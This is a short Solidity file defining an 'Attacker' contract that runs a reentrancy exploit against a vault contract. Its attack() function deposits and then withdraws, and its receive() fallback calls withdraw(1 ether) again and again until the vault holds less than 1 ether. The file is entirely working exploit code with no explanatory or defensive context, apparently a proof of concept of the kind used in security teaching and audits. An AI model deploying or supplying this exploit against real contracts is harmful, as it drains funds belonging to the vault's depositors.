// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {

    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    // запуск атаки
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    // fallback → reentrancy
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}